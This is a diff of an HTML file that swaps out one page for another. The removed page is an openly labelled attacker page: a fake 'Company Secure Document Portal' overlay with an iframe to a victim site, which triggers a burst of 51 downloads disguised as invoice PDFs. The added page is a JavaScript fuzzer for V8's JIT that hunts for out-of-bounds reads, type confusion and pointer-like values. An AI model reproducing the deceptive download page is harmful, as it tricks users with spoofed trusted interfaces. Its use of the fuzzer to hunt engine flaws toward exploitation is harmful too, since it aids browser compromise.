@@ -1,85 +1,214 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Secure Document Portal</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-        }
+<!doctype html>
+<meta charset="utf-8">
+<title>V8 Engine Stress Fuzzer</title>
 
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        #overlay button {
-            padding: 12px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        iframe {
-            margin-top: 20px;
-            border: 2px solid red;
-        }
-    </style>
-</head>
-<body>
-
-<!-- Fake trusted UI -->
-<div id="overlay">
-    <h2>Company Secure Document Portal</h2>
-    <p>Download dokumen penting Anda.</p>
-    <button onclick="startAttack()">Download Sekarang</button>
-</div>
-
-<h1>Attacker Page (localhost:8787)</h1>
-
-<!-- Victim iframe -->
-<iframe src="http://cnfdnfial-ops.github.io/spoof/victims.html" width="400" height="200"></iframe>
+<pre id="log"></pre>
 
 <script>
-    function triggerDownloads() {
-        console.log('[*] Triggering multiple downloads...');
 
-        for (let i = 0; i < 51; i++) {
-            setTimeout(() => {
-                const a = document.createElement('a');
+const log = m=>{
+  document.getElementById("log").textContent += m+"\n"
+  console.log(m)
+}
 
-                a.href = 'data:text/plain;charset=utf-8,Confidential Document ' + i;
+// =========================
+// TARGET FUNCTION (JIT)
+// =========================
 
-                // File dibuat realistis
-                a.download = 'Invoice_2026_' + i + '.pdf';
+function vuln(a,i){
+  return a[i] + 1.1
+}
 
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
+// =========================
+// TRAIN FOR TURBOFAN
+// =========================
 
-            }, i * 60); // delay natural
+function train(){
+
+  let a=[]
+
+  for(let i=0;i<200;i++)
+    a.push(i+0.5)
+
+  for(let i=0;i<50000;i++)
+    vuln(a,i%100)
+
+  return a
+}
+
+// =========================
+// ARRAY SHAPE CHAOS
+// =========================
+
+function mutateArray(a){
+
+  let choice=Math.floor(Math.random()*8)
+
+  switch(choice){
+
+    case 0:
+      delete a[Math.floor(Math.random()*20)]
+      break
+
+    case 1:
+      a.length=Math.floor(Math.random()*30)
+      break
+
+    case 2:
+      a[100+Math.floor(Math.random()*200)]=13.37
+      break
+
+    case 3:
+      a[Math.floor(Math.random()*20)]={x:1}
+      break
+
+    case 4:
+      Object.defineProperty(a,5,{
+        get(){
+          a.push(99.9)
+          return 1.1
         }
+      })
+      break
 
-        console.log('[*] Download burst completed.');
+    case 5:
+      a.__proto__=[]
+      break
+
+    case 6:
+      a=new Proxy(a,{
+        get(target,prop){
+          if(prop==="length"){
+            target.push(13.37)
+          }
+          return Reflect.get(target,prop)
+        }
+      })
+      break
+
+    case 7:
+      a.splice(3,0,13.37)
+      break
+  }
+
+  return a
+}
+
+// =========================
+// TYPED ARRAY TARGET
+// =========================
+
+let buf=new ArrayBuffer(0x400)
+let f64=new Float64Array(buf)
+let u32=new Uint32Array(buf)
+
+// =========================
+// GC PRESSURE
+// =========================
+
+function gc(){
+
+  let t=[]
+
+  for(let i=0;i<50;i++)
+    t.push(new ArrayBuffer(1024*1024))
+
+}
+
+// =========================
+// CHECKERS
+// =========================
+
+function checkArray(a){
+
+  for(let i=0;i<a.length+50;i++){
+
+    let v=a[i]
+
+    if(typeof v!=="number" && typeof v!=="object" && v!==undefined){
+      log("TYPE BREAK "+i+" "+v)
+      return true
     }
 
-    function startAttack() {
-        document.getElementById('overlay').innerHTML = "<h3>Memproses permintaan...</h3>";
-
-        // Delay biar realistis
-        setTimeout(() => {
-            triggerDownloads();
-        }, 1200);
+    if(typeof v==="number" && Math.abs(v)>1e12){
+      log("POTENTIAL POINTER "+v)
+      return true
     }
+
+  }
+
+  let leak=a[a.length+10]
+
+  if(leak!==undefined){
+    log("POSSIBLE OOB "+leak)
+    return true
+  }
+
+  return false
+}
+
+function checkTyped(){
+
+  for(let i=0;i<f64.length;i++){
+
+    let v=f64[i]
+
+    if(!Number.isFinite(v)){
+      log("FLOAT CORRUPTION "+v)
+      return true
+    }
+
+    if(Math.abs(v)>1e12){
+      log("PTR LIKE VALUE "+v)
+      return true
+    }
+
+  }
+
+  return false
+}
+
+// =========================
+// MAIN
+// =========================
+
+function run(){
+
+  log("[*] training JIT")
+
+  let base=train()
+
+  log("[*] fuzzing")
+
+  for(let i=0;i<15000;i++){
+
+    let arr=mutateArray([...base])
+
+    vuln(arr,5)
+
+    f64[i%f64.length]=i+0.5
+
+    if(i%30===0) gc()
+
+    if(checkArray(arr)){
+      log("⚠ ARRAY INVARIANT BREAK")
+      return
+    }
+
+    if(checkTyped()){
+      log("⚠ TYPED ARRAY ANOMALY")
+      return
+    }
+
+    if(i%1000===0)
+      log("iter "+i)
+
+  }
+
+  log("[*] completed without anomaly")
+
+}
+
+run()
+
 </script>
-
-</body>
-</html>
